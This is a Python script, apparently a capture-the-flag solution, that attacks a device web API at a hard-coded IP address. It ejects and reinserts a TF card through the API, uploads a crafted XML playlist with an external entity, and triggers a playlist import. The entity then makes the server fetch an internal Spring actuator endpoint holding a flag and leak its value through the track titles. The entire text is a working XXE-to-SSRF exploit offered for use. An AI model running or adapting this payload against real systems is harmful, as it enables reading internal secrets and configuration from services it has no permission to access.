from __future__ import annotations

import json
import sys
import urllib.request
import uuid

PAYLOAD_NAME = "evil.xml"


def payload_xml(entity: str) -> bytes:
    """构造带外部实体的播放列表。"""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<!DOCTYPE playlist [\n"
        f'  <!ENTITY xxe SYSTEM "{entity}">\n'
        "]>\n"
        '<playlist version="2">\n'
        "  <track><title>&xxe;</title><path>evil.mp3</path></track>\n"
        "</playlist>\n"
    ).encode()


def call(
    url: str,
    data: bytes | None = None,
    method: str = "GET",
    headers: dict | None = None,
):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    with urllib.request.urlopen(req, timeout=20) as resp:
        raw = resp.read()
    try:
        return json.loads(raw)
    except ValueError:
        return raw.decode("utf-8", "replace")


def upload(base: str, name: str, content: bytes):
    boundary = "----nostalgia" + uuid.uuid4().hex
    body = b"".join(
        [
            f"--{boundary}\r\n".encode(),
            f'Content-Disposition: form-data; name="file"; filename="{name}"\r\n'.encode(),
            b"Content-Type: application/xml\r\n\r\n",
            content,
            f"\r\n--{boundary}--\r\n".encode(),
        ]
    )
    return call(
        f"{base}/api/device/tf/upload",
        body,
        "POST",
        {"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )


base = "http://110.42.112.160:34870"
entity = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/actuator/env/FLAG"
print(f"[*] 设备     {base}")
print(f"[*] 外部实体 {entity}")

# 1) 拔卡（只有拔出状态才允许写入）
call(f"{base}/api/device/tf/eject", b"", "POST")
# 2) 上传恶意播放列表
uploaded = upload(base, PAYLOAD_NAME, payload_xml(entity))
print(f"[*] 已传入暂存区 {uploaded['name']} ({uploaded['size']} B)")
# 3) 插卡（重名会被自动改名，以返回的 added 为准）
inserted = call(f"{base}/api/device/tf/insert", b"", "POST")
name = (inserted.get("added") or [PAYLOAD_NAME])[-1]
print(f"[*] 插卡后新增 {inserted.get('added')}")
# 4) 音乐列表「导入 XML」→ 触发 XXE
result = call(
    f"{base}/api/playlist/import",
    json.dumps({"name": name}).encode(),
    "POST",
    {"Content-Type": "application/json"},
)

print(
    f"[*] 导入 {result.get('source')}：ok={result.get('ok')} "
    f"tracks={len(result.get('tracks') or [])} 字段={list(result)}"
)
titles = [t.get("title", "") for t in result.get("tracks") or []]
for title in titles:
    print(f"[*] 歌名  {title}")
